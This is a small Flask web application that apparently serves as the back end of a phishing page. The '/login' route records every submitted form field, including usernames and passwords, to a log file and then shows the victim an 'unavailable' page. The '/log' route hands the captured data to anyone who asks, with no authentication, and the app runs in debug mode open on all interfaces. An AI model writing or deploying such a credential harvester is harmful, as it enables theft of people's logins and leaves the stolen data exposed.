from flask import Flask, render_template, request, redirect
from constants import LOG_FILE_PATH
import tempfile

app = Flask(__name__)

# Define a route to render the new HTML file


@app.route("/")
def index():
    return render_template("index.html")

# Define a route to handle form submissions


@app.route("/login", methods=["POST"])
def login():
    # Create a temporary file in a writable directory
    with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
        # Write the data to the temporary file
        for key, value in request.form.items():
            f.write(f"{key}={value}\n")
        # Get the path of the temporary file
        temp_path = f.name

    # Move the temporary file to a read-only directory
    with open(temp_path, 'r') as f:
        log_data = f.read()
    with open(LOG_FILE_PATH, 'a') as f:
        f.write(log_data)
    return render_template("unavailable.html")


@app.route('/log')
def view_log():
    # Open the file for reading
    with open(LOG_FILE_PATH, 'r') as file:
        # Read the contents of the file
        file_contents = file.read()

    # Return the contents as a response
    return file_contents


# Run the app
if __name__ == "__main__":
    app.debug = True
    app.run(host="0.0.0.0", port=5000)
